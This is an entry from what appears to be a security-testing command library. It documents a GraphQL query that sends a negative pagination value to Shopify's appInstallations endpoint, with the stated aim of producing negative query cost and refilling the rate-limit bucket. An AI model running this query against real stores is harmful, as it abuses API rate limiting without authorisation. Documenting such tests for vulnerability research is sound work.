---
data: |-
  {
    appInstallations(first: -100) {
      edges {
        node {
          id
        }
      }
    }
  }
tags:
  - graphql
  - testing
type: command
output: null
executor: graphql
platforms:
  - Web
  - Shopify
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.299Z'
id: 6d337bce-c948-4d46-b8e5-b401ab06f6b5
verified: false
validated: true
submitted: true
---
# negative-pagination-test-query

## Command

```graphql
{
  appInstallations(first: -100) {
    edges {
      node {
        id
      }
    }
  }
}
```

## Description

Simple GraphQL query using negative 'first' value to test for negative cost deduction in Shopify's API, confirming the vulnerability.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| first: -100 | Negative pagination causing negative cost | Yes |

## Examples

### Basic Usage

Run in GraphiQL to observe cost.

```graphql
{ appInstallations(first: -100) { ... } }
```

## Expected Output

Response with extensions { cost: -100 }, increasing bucket points.

## Related

- [[commands/high-cost-appinstallations-query]]
